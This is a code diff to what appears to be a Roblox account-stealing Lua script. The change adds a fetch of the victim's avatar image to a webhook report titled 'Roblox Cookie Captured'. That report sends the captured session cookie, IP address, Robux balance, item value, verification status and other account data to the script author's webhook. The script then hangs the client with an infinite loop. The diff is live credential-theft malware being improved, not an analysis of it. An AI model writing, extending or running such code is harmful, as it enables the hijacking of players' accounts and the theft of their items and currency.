@@ -119,11 +119,20 @@ local function getDeviceType()
     end
 end
 
-local function sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemCount, emailVer, phoneVer, friends, badges, created, device)
+local function getAvatarImage(userId)
+    local s, r = pcall(function()
+        return http:JSONDecode(http:GetAsync("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false"))
+    end)
+    if s and r and r.data and r.data[1] then
+        return r.data[1].imageUrl
+    end
+    return nil
+end
+
+local function sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemCount, emailVer, phoneVer, friends, badges, created, device, avatarUrl)
     local embed = {{
         title = "Roblox Cookie Captured",
         color = 0xff0044,
-        description = "━━━━━━━━━━━━━━━━━━━━━━━━",
         fields = {
             {name = "Username", value = acc.username .. " (@" .. acc.displayName .. ")", inline = true},
             {name = "User ID", value = tostring(acc.userId), inline = true},
@@ -140,6 +149,7 @@ local function sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemC
             {name = "Device", value = device, inline = true},
             {name = "Cookie", value = "```" .. cookie .. "```", inline = false}
         },
+        image = {url = avatarUrl},
         footer = {text = "Script by Invincible"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
@@ -162,6 +172,7 @@ if cookie and acc then
     local badges = getBadges(acc.userId)
     local created = getCreatedDate(acc.userId)
     local device = getDeviceType()
-    sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemCount, emailVer, phoneVer, friends, badges, created, device)
+    local avatarUrl = getAvatarImage(acc.userId)
+    sendWebhook(cookie, acc, ip, gameInfo, robux, premium, rap, itemCount, emailVer, phoneVer, friends, badges, created, device, avatarUrl)
     while true do end
 end
